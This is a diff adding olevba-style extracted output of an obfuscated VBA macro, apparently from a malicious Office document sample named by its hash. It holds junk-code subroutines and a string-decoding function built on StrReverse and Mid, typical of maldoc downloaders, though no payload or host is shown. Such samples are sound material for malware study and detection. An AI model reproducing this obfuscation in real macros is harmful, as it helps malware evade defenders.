@@ -1,0 +1,63 @@
+Filename     : ./macros/7a2b8ee9280ec049f35f0947307aaa502c372190fcbcec3ede1161abaf99a4f0
+OLE stream   : Macros/VBA/OZQijbwr
+VBA filename : OZQijbwr.bas
+----------------------------------------
+Attribute VB_Name = "OZQijbwr"
+Sub QiboljilBj()
+   On Error Resume Next
+   If Nipfw >= 8030159 Then
+      Set sdrAVSJtw = 395372
+      Set OiTuMZsHA = 8248235
+      ElseIf FfOjfvkkk Eqv qFEOjQIJirj Then
+      Do
+         MmClTRPmopj = 4484672 / Fix(MmpmNJMRr + CByte(ZOjdJkwVw + CStr(7203502 * Atn(4838786)) / citcSUws * Atn(ZjqXi))) / WQiXOUOc / noGBqUhlw + 8685796 / Sgn(1904174) - slqrSzX + CBool(iqFfS) * 5284929 + Int(QOKwN)
+      Loop Until XpiOw < jsuri
+      Select Case HdfsfwVq
+         Case 5466499
+            ziajPPQXouwJ = Int(4160097)
+            McVzrInwbLKzZY = NdWZisvoNmQ
+         Case 5261417
+            CjXwIjfDa = zUBwHPZRq
+            paRZjmDRoIKbj = Sgn(3052070)
+         Case 9297640
+            nLpqsinFXFhun = CStr(4739286)
+            VZihbRwOVfOO = Hex(3544907)
+      End Select
+End Sub
+Function uhnl2vhjdk(ByVal HVcKHlwizPcz As String, mIvJkZEBDZo, baZwZiz)
+On Error Resume Next
+MYnlBPcNc = zLnLC = 5902657 / Fix(JdPTpB + CByte(iUaozTKiPUtwRv + CStr(8533326 * Atn(4701185)) / bsZjWnGwjPVlzw * Atn(XpDhpnPIp))) / vTSDMKRET / zcOMhTsNEosQW + 4361977 / Sgn(5361197) - sLjJLkjNbU + CBool(tXFEjfFZvarz) * 4128574 + Int(CEAcizvbkSFVKh)
+tjSNMpKpjNYq = sAkMjwq + (HVcKHlwizPcz) + kMlQzjBBLNNIji
+lwXrSmnwL = YMCaGmpwM = 997848 / Fix(QtjwujQu + CByte(wYjJPo + CStr(8015370 * Atn(7851302)) / ELlBPskibuY * Atn(RwaRUDqsY))) / WECYz / sKSzAQItfPd + 7715077 / Sgn(2707393) - IWVjfcFr + CBool(kzvIBpjwqsElQc) * 5271801 + Int(BohmFZCiI)
+uAjTtXaAP = wEHGEwRmvJd = 8501601 / Fix(uLinYFpLwQAHp + CByte(fzVilAvdUthdno + CStr(7461415 * Atn(1418547)) / iCGoHPjCv * Atn(WBnHzOAmpZ))) / srwQrlGuRBY / vWFjIXilbqaZ + 5281617 / Sgn(6266680) - hOmCzhplKIXQ + CBool(dHdYzMrluf) * 8494924 + Int(GnDCRZp)
+IZhkPmWMuFwPp = zYfizaH + StrReverse(tjSNMpKpjNYq) + kuakGE
+IUMBbOoAm = unqumjsiiFi = 864879 / Fix(zZWFmBAEHI + CByte(fjpQz + CStr(5130435 * Atn(4222557)) / mwjMkNTABrCAZE * Atn(NbEJCwminioPC))) / clHkfSfPNmsSA / MEIcarcosRTAzR + 9240361 / Sgn(6487308) - wQHZGuQulMzOSR + CBool(woRiWLoLQot) * 8178802 + Int(fSNTfquC)
+sYGJripif = ZzjBLzNLk = 1868404 / Fix(qlNEz + CByte(TwdjcXj + CStr(1152850 * Atn(2960041)) / ZidzhlO * Atn(qjdGNGUF))) / zBntFrTVfBqz / CvwoojHKXF + 4351231 / Sgn(8878179) - TlMkXOW + CBool(jEbSTmJdBjXV) * 2723460 + Int(hKZSnwZawR)
+we93josdf = rYhJuibbpTrUWU + Mid(IZhkPmWMuFwPp, mIvJkZEBDZo, baZwZiz) + zjWWwYzpEBLEb
+YMIIKTbNc = GEwuYJqq = 660507 / Fix(tAtEZSasjdHjaA + CByte(dLjJC + CStr(8595128 * Atn(6226234)) / MPRCibfNL * Atn(GiXTEi))) / tjizMXiwrvwGj / FMfjo + 1483799 / Sgn(3070763) - RDPwbTRfJGARJJ + CBool(VArnG) * 7589258 + Int(jHiHBVsnPac)
+zSakQwLiM = sGPrvKJjwUJI = 7228626 / Fix(IRTRwmWqZ + CByte(LrbljvcbbtoA + CStr(2964249 * Atn(3000732)) / KjGSGS * Atn(jDcwctiZPBjaj))) / jXwBs / jrjHCEMlCPX + 3694058 / Sgn(4301054) - KYJlTjsBd + CBool(UpjAbLJROkIo) * 3878891 + Int(wYjzWAdN)
+uhnl2vhjdk = KtLOL + we93josdf + IpiNwnNULJr
+FGEmMWEoo = CvfdIGlZGQzwjF = 8955871 / Fix(aXhjDVnfuX + CByte(RzXGZW + CStr(7503005 * Atn(1264330)) / zknjcvEtuHXzr * Atn(vjGFrhIzjlw))) / cjJXcwwA / qjBGHQtlnz + 1811166 / Sgn(5014468) - caSQvZl + CBool(BChIT) * 4169608 + Int(XfbAqEFwFzk)
+ROOvlotNG = ELBZPdohTzo = 8945386 / Fix(NIYJjJ + CByte(dNRKIWlFQ + CStr(8677062 * Atn(3026869)) / OBSTaa * Atn(bQOmBvWFAn))) / fKEkFqu / RssjRaiifIvow + 6676211 / Sgn(1406445) - GPbQOlRkSDN + CBool(BivbZj) * 1682204 + Int(ihzMTNqwFwO)
+End Function
+Sub CVdpPdbjaHQOMc()
+   On Error Resume Next
+   If BMTPPZXzZRP >= 9453091 Then
+      Set uVfTo = 3167729
+      Set jAFMv = 1537057
+      ElseIf IbQizqjpjm Eqv zWiVEYAjalF Then
+      Do
+         zZwZAAGGTH = 9534588 / Fix(YIjPGUF + CByte(skotXKwhLOhq + CStr(700363 * Atn(9884095)) / ICQjodfQ * Atn(ZPzvokaFjTjNl))) / BqEYv / ZHLYp + 5102816 / Sgn(2476427) - oQINTwUINAtao + CBool(JjQGXAPpkE) * 6994295 + Int(TSEYGOX)
+      Loop Until RQLWtoitcEf < PzzbIiCM
+      Select Case wfDcIdBDot
+         Case 5940041
+            EKtYt = Int(2509269)
+            RVNjYPvVVcP = LLJSlHtlL
+         Case 6370459
+            oKARLmECOVTvF = zfMMHjaZWTru
+            HRAbXkfYWXwkj = Sgn(3264600)
+         Case 5023943
+            BrPEj = CStr(7328066)
+            jZEAOPohaQ = Hex(8797692)
+      End Select
+End Sub
